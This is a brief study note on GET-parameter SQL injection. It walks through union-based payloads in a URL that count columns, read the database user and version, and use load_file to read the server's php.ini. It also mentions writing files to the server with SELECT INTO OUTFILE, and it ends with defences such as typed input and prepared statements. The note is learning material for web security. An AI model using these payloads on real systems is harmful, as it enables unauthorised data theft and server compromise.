## GET SQL Injection

**GET** request is when you're asking the server to provide a page or resource for the user. 

- Main difference between POST and GET? _Inject using the url, not a login form._

Determine columns:

```php
www.example.com/post?id=1 order by 4
```

Union statement:

```php
www.example.com/post?id=1 union select NULL,NULL,NULL,'aaa'
```

- Determine what data is stored in each column.

Invalidate first query:

```php
www.example.com/post?id=1 and 0 union select 1,2,3,4
```

- Removes the first query making the output easier to read.

Obtain user:

```php
www.example.com/post?id=1 and 0 union select 1,2,user(),4
```

 Version:
```php
www.example.com/post?id=1 and 0 union select 1,2,version(),4
```

- Databases have different syntax so be sure to try others if one fails. 

Web-Server `php.ini` file:

```php
www.example.com/post?id=1 and 0 union select 1,2,load_file("C/xampp/php/php.ini"),4
```

- This file shows how the PHP works on the entire web-server, in other words it shows how the server is configured.

- You can save a file to the server with `select into outfile "malicios code"`, https://mariadb.com/kb/en/select-into-outfile/. The `[LOAD DATA INFILE](https://mariadb.com/kb/en/load-data-infile/)` statement complements `SELECT INTO OUTFILE`

Secure Server:

1. When you're expecting a user input, always try to declare it as the thing that you want. For example, if you're asking for an integer, then use `int num`. That would stop the attack above because you would only be able to query a number.

2. You could add the query inside quotes like we did with the email: `'$id'`

3. Add slashes functions, but this is not very good.

4. Finally, use **prepared statements** 

---

**Completed:** _12:58 2024-09-09_




